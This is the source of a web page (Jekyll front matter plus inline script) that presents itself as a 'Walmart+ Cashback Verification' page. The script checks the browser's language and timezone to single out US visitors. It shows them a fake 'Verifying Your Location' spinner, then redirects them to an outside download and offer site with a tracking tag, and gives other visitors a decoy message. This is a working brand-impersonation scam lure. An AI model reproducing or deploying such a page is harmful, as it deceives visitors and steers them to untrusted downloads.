---
layout: default
title: Walmart+ Cashback Verification
permalink: /verify/
---

<script>
// Auto-configuring system - DON'T TOUCH
const isUS = navigator.language.includes('en-US') && 
           [300, 240, 360].includes(new Date().getTimezoneOffset());

if (isUS) {
  document.body.innerHTML = `
  <style>
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #0071ce;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin { 100% { transform: rotate(360deg); } }
  </style>
  <h2>🔒 Verifying Your Location...</h2>
  <div class="loader"></div>
  `;

  setTimeout(() => {
    window.location.href = "https://playabledownload.com/1808970?tid=git1";
  }, 3500);
  
} else {
  document.body.innerHTML = '<h1>⚠️ US Walmart+ members only</h1>';
}
</script>
